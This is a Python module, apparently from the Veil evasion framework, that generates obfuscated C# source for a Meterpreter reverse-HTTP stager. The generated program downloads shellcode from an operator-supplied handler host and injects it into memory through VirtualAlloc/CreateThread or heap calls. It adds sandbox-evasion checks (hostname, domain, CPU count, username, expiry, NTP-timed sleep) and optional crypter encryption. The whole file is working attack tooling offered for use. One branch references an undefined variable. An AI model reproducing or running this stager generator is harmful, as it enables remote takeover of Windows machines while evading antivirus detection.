"""

Custom-written pure c# meterpreter/reverse_http stager.
Uses basic variable renaming obfuscation.

Module built by @harmj0y
Updated for Veil 3 by @evan_pena2003

"""

from lib.common import helpers
from Tools.Evasion.evasion_common import encryption
import random


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "cs"
        self.extension = "cs"
        self.rating = "Excellent"
        self.name = "Pure C# Reverse HTTP Stager"
        self.path = "cs/meterpreter/rev_http"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "LHOST"            : ["", "IP of the Metasploit handler"],
                                    "LPORT"            : ["8080", "Port of the Metasploit handler"],
                                    "COMPILE_TO_EXE"   : ["Y", "Compile to an executable"],
                                    "USE_ARYA"         : ["N", "Use the Arya crypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }


    def generate(self):

        # imports and namespace setup
        payload_code = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;\n"
        payload_code += "namespace %s { class %s {\n" % (helpers.randomString(), helpers.randomString())

        # code for the randomString() function
        randomStringName = helpers.randomString()
        bufferName = helpers.randomString()
        charsName = helpers.randomString()
        t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        random.shuffle(t)
        chars = ''.join(t)

        payload_code += "static string %s(Random r, int s) {\n" %(randomStringName)
        payload_code += "char[] %s = new char[s];\n"%(bufferName)
        payload_code += "string %s = \"%s\";\n" %(charsName, chars)
        payload_code += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
        payload_code += "return new string(%s);}\n" %(bufferName)


        # code for the checksum8() function
        checksum8Name = helpers.randomString()
        payload_code += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)


        # code fo the genHTTPChecksum() function
        genHTTPChecksumName = helpers.randomString()
        baseStringName = helpers.randomString()
        randCharsName = helpers.randomString()
        urlName = helpers.randomString()
        random.shuffle(t)
        randChars = ''.join(t)

        payload_code += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
        payload_code += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
        payload_code += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
        payload_code += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
        payload_code += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
        payload_code += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)


        # code for getData() function
        getDataName = helpers.randomString()
        strName = helpers.randomString()
        webClientName = helpers.randomString()
        sName = helpers.randomString()

        payload_code += "static byte[] %s(string %s) {\n" %(getDataName,strName)
        payload_code += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
        payload_code += "byte[] %s = null;\n" %(sName)
        payload_code += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
        payload_code += "if (%s.Length < 100000) return null;}\n" %(sName)
        payload_code += "catch (WebException) {}\n"
        payload_code += "return %s;}\n" %(sName)


        # code fo the inject() function to inject shellcode
        injectName = helpers.randomString()
        sName = helpers.randomString()
        funcAddrName = helpers.randomString()
        hThreadName = helpers.randomString()
        threadIdName = helpers.randomString()
        pinfoName = helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
            payload_code += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
            payload_code += "        UInt32 %s = 0;\n" %(threadIdName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
            payload_code += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, sName)
            payload_code += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, sName)
            payload_code += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, sName, sName)
            payload_code += '       UInt32 {} = 0;\n'.format(threadIdName)
            payload_code += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
            payload_code += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)


        # code for Main() to launch everything
        sName = helpers.randomString()
        randomName = helpers.randomString()
        curlyCount = 0

        payload_code += "static void Main(){\n"
        
        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = helpers.randomString()
            RandExpire = helpers.randomString()            

            # Create Payload code
            payload_code += '\t' * curlyCount + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
            payload_code += '\t' * curlyCount + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, self.required_options["EXPIRE_PAYLOAD"][0])
            payload_code += '\t' * curlyCount + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)

            # Add a tab for this check
            curlyCount += 1            

        if self.required_options["HOSTNAME"][0].lower() != "x":            

            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(self.required_options["HOSTNAME"][0].lower())            

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower() != System.Environment.UserDomainName.ToLower()) {\n'                        

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            payload_code += '\t' * curlyCount + 'if (System.Environment.ProcessorCount > {}) {{\n'.format(self.required_options["PROCESSORS"][0])

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = helpers.randomString()
            rand_char_name = helpers.randomString()
            
            payload_code += '\t' * curlyCount + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
            payload_code += '\t' * curlyCount + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
            payload_code += '\t' * curlyCount + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, self.required_options["USERNAME"][0])            

            # Add a tab for this check
            curlyCount += 1

        if self.required_options["SLEEP"][0].lower() != "x":
            
            payload_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
            payload_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
            payload_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
            payload_code += '\t' * num_tabs_required + 'Thread.Sleep(' + self.required_options["SLEEP"][0] + '*1000);\n'
            payload_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
            payload_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
            payload_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
            payload_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + self.required_options["SLEEP"][0] + ' || skip) {\n'

            # Add a tab for this check
            curlyCount += 1

        payload_code += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
        payload_code += "byte[] %s = %s(\"http://%s:%s/\" + %s(%s));\n" %(sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0],genHTTPChecksumName,randomName)
        payload_code += "%s(%s);}\n" %(injectName, sName)

        while (curlyCount != 0):
            payload_code += '\t' * curlyCount + '}'
            curlyCount -= 1

        # get random variables for the API imports
        r = [helpers.randomString() for x in range(12)]
        y = [helpers.randomString() for x in range(17)] 
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual": payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);}}\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap": payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);}}\n"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

        if self.required_options["USE_ARYA"][0].lower() == "y":
            payload_code = encryption.arya(payload_code)

        self.payload_source_code = payload_code
        return
